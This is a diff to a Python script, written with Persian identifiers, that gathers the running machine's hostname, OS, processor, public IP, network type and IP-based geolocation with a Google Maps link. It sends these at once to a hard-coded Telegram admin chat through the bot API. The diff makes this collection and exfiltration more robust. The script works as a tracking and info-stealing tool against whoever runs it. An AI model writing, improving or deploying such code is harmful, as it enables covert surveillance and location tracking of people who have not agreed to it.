@@ -8,21 +8,23 @@ import os
 ایدی_ادمین = "8152202322"
 
 def دریافت_اطلاعات_دستگاه():
-    """دریافت نام دستگاه، مدل، و سیستم‌عامل"""
-    نام_دستگاه = platform.node()
-    سیستم_عامل = platform.system() + " " + platform.release()
-    مدل_دستگاه = platform.machine()
-    پردازنده = platform.processor()
-    return نام_دستگاه, سیستم_عامل, مدل_دستگاه, پردازنده
-
-def دریافت_آیپی_کاربر():
-    """دریافت آی‌پی کاربر"""
+    """دریافت نام دستگاه، مدل، سیستم‌عامل و پردازنده"""
     try:
-        میزبان = socket.gethostname()
-        آیپی = socket.gethostbyname(میزبان)
-        return آیپی
-    except Exception as e:
-        return f"خطا در دریافت آی‌پی: {e}"
+        نام_دستگاه = platform.node()
+        سیستم_عامل = platform.system() + " " + platform.release()
+        مدل_دستگاه = platform.machine()
+        پردازنده = platform.processor()
+        return نام_دستگاه, سیستم_عامل, مدل_دستگاه, پردازنده
+    except Exception:
+        return "نامشخص", "نامشخص", "نامشخص", "نامشخص"
+
+def دریافت_آیپی_عمومی():
+    """دریافت آی‌پی واقعی اینترنتی"""
+    try:
+        پاسخ = requests.get("https://api64.ipify.org?format=json", timeout=5)
+        return پاسخ.json()["ip"]
+    except Exception:
+        return "خطا در دریافت آی‌پی"
 
 def دریافت_نوع_شبکه():
     """تشخیص نوع اینترنت (WiFi یا داده موبایل)"""
@@ -33,30 +35,39 @@ def دریافت_نوع_شبکه():
         else:
             نوع_شبکه = "داده موبایل"
         return نوع_شبکه
-    except Exception as e:
-        return f"خطا در تشخیص شبکه: {e}"
+    except Exception:
+        return "خطا در تشخیص شبکه"
 
 def دریافت_موقعیت_مکانی(آیپی):
     """دریافت موقعیت مکانی براساس آی‌پی و ایجاد لینک گوگل مپ"""
     try:
-        پاسخ = requests.get(f"http://ip-api.com/json/{آیپی}")
+        پاسخ = requests.get(f"http://ip-api.com/json/{آیپی}", timeout=5)
         داده = پاسخ.json()
+        if داده["status"] == "fail":
+            return "نامشخص", ""
         عرض, طول = داده['lat'], داده['lon']
         اطلاعات_مکانی = f"{داده['country']}, {داده['regionName']}, {داده['city']}"
         لینک_گوگل_مپ = f"https://www.google.com/maps?q={عرض},{طول}"
         return اطلاعات_مکانی, لینک_گوگل_مپ
-    except Exception as e:
-        return f"خطا در دریافت موقعیت مکانی: {e}", ""
+    except Exception:
+        return "خطا در دریافت موقعیت مکانی", ""
 
 def ارسال_به_ادمین(پیام):
     """ارسال پیام فقط به ادمین از طریق تلگرام"""
-    لینک = f"https://api.telegram.org/bot{توکن_ربات}/sendMessage"
-    داده = {"chat_id": ایدی_ادمین, "text": پیام}
-    requests.post(لینک, داده)
+    try:
+        لینک = f"https://api.telegram.org/bot{توکن_ربات}/sendMessage"
+        داده = {"chat_id": ایدی_ادمین, "text": پیام}
+        پاسخ = requests.post(لینک, داده, timeout=5)
+        if پاسخ.status_code == 200:
+            print("✅ پیام با موفقیت ارسال شد.")
+        else:
+            print("❌ خطا در ارسال پیام.")
+    except Exception:
+        print("⚠️ اتصال به تلگرام امکان‌پذیر نیست!")
 
 # دریافت و ارسال اطلاعات
 نام_دستگاه, سیستم_عامل, مدل_دستگاه, پردازنده = دریافت_اطلاعات_دستگاه()
-آیپی_کاربر = دریافت_آیپی_کاربر()
+آیپی_کاربر = دریافت_آیپی_عمومی()
 نوع_شبکه = دریافت_نوع_شبکه()
 اطلاعات_مکانی, لینک_گوگل_مپ = دریافت_موقعیت_مکانی(آیپی_کاربر)
 
@@ -72,4 +83,3 @@ def ارسال_به_ادمین(پیام):
 """
 
 ارسال_به_ادمین(پیام)
-print("✅ اطلاعات با موفقیت به تلگرام ارسال شد.")
